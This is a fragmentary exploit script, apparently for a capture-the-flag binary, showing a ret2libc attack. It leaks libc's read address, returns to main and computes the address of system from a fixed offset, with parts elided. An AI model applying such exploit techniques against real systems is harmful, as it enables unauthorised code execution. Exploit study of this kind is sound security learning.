...
main = 0x804841d
data = 0x08049620 # pointer in memory for reading and writing, idk the program for what it uses it but its valid for me
...
# write to stdout the libc leak of read and rewind main
...
system_libc = read_libc - 0xc1f70 # calculate offset to system
print("system_libc: ", hex(system_libc))

# read the string and put it in data
